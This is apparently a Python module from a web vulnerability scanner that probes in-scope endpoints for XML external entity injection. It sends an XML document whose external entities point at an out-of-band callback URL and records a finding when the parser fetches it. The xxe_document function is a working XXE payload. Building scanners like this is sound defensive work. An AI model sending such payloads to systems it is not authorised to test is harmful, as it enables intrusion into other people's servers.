from __future__ import annotations

import re
import time
from urllib.parse import urlsplit

from venomscan_engine.checks.probes import canary
from venomscan_engine.checks.registry import register
from venomscan_engine.context import ScanContext
from venomscan_engine.models import EndpointRecord, Finding, Severity, VerificationStatus
from venomscan_engine.safety.http import BudgetExceeded, TargetUnreachable, TooManyRedirects
from venomscan_engine.safety.scope import ScopeViolation

MAX_TARGETS = 2
CALLBACK_WAIT_SECONDS = 3.0
XML_PARAM_HINTS = {
    "xml",
    "xmldata",
    "xml_data",
    "xmlbody",
    "xml_body",
    "xmlinput",
    "soap",
    "saml",
    "xsd",
    "wsdl",
}
_XML_PATH = re.compile(r"(?i)(?:^|/)(?:xml|soap|saml|wsdl|xsd|import|upload|feed|rss)(?:[/.]|$)")
_SKIP_PATHS = re.compile(
    r"(?i)(logout|signout|delete|remove|unsubscribe|checkout|purchase|pay|subscribe)"
)


def xxe_document(callback_url: str, token: str) -> str:
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        "<!DOCTYPE vs [\n"
        f'  <!ENTITY % remote SYSTEM "{callback_url}">\n'
        "  %remote;\n"
        f'  <!ENTITY xxe SYSTEM "{callback_url}">\n'
        "]>\n"
        f'<vs token="{token}">&xxe;</vs>\n'
    )


def _candidates(ctx: ScanContext) -> list[EndpointRecord]:
    selected: list[EndpointRecord] = []
    for endpoint in ctx.endpoints:
        if len(selected) >= MAX_TARGETS:
            break
        if endpoint.method.upper() not in {"POST", "PUT", "PATCH"}:
            continue
        if _SKIP_PATHS.search(endpoint.url):
            continue
        parts = urlsplit(endpoint.url)
        if parts.scheme not in {"http", "https"}:
            continue
        try:
            ctx.scope.check(endpoint.url)
        except ScopeViolation:
            continue
        names = {name.lower() for name in endpoint.parameters}
        xml_content = (endpoint.content_type or "").lower()
        if (
            names & XML_PARAM_HINTS
            or _XML_PATH.search(parts.path)
            or "xml" in xml_content
            or "soap" in xml_content
        ):
            selected.append(endpoint)
    return selected


@register
class XxeCheck:
    id = "venom.xxe"
    name = "XML external entity (out-of-band callback)"
    category = "injection"
    default_severity = Severity.HIGH
    profile = "active"

    async def run(self, ctx: ScanContext) -> list[Finding]:
        oob = ctx.artifacts.get("oob")
        if oob is None or not getattr(oob, "base_url", None):
            await ctx.emit(
                "analyzing",
                "warning",
                "XXE skipped: no out-of-band listener is configured for this deployment",
                payload={"check_id": self.id},
            )
            return []
        if ctx.root is None or ctx.remaining_seconds < 8:
            return []

        findings: list[Finding] = []
        for endpoint in _candidates(ctx):
            if ctx.remaining_seconds < 6:
                break
            token = canary(ctx, self.id, endpoint.url)
            callback_url = oob.url_for(token)
            payload = xxe_document(callback_url, token)
            started = time.time()
            try:
                response = await ctx.client.request(
                    endpoint.method.upper(),
                    endpoint.url,
                    headers={
                        "Content-Type": "application/xml",
                        "Accept": "application/xml, text/xml, */*",
                    },
                    content=payload,
                )
            except BudgetExceeded:
                break
            except (TargetUnreachable, TooManyRedirects):
                continue
            wait_seconds = min(CALLBACK_WAIT_SECONDS, max(0.5, ctx.remaining_seconds - 2))
            hit = await oob.wait_for(token, wait_seconds, since=started)
            if hit is None:
                continue
            findings.append(
                Finding(
                    check_id=self.id,
                    title="XML parser resolved an external entity",
                    category=self.category,
                    severity=Severity.HIGH,
                    confidence=9,
                    verification_status=VerificationStatus.VERIFIED,
                    url=endpoint.url,
                    method=endpoint.method.upper(),
                    parameter="body",
                    payload=callback_url,
                    description=(
                        f"A POST to {endpoint.url} carried a minimal XML document that declares "
                        "an external entity pointing at an out-of-band URL. The XML parser fetched "
                        "that URL itself: the listener recorded the request for this scan's token."
                    ),
                    impact=(
                        "External entity expansion lets an attacker read local files, reach "
                        "internal services and pivot through the host that parses the document."
                    ),
                    remediation=(
                        "Disable DTDs and external entity resolution in every XML parser "
                        "(defusedxml in Python, disallow-doctype-decl in Java, DtdProcessing=false "
                        "in .NET), and reject documents that declare entities."
                    ),
                    references=[
                        "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
                        "https://portswigger.net/web-security/xxe",
                    ],
                    cwe=["CWE-611"],
                    owasp=["A05:2021 Security Misconfiguration"],
                    request_evidence={
                        "method": endpoint.method.upper(),
                        "url": endpoint.url,
                        "content_type": "application/xml",
                        "payload_bytes": len(payload),
                    },
                    response_evidence={
                        "external_entity_fetched": True,
                        "callback_method": hit.method,
                        "callback_path": hit.path,
                        "source_ip": hit.source_ip,
                        "status_code": response.status_code,
                        "body_stored": False,
                    },
                )
            )
        return findings
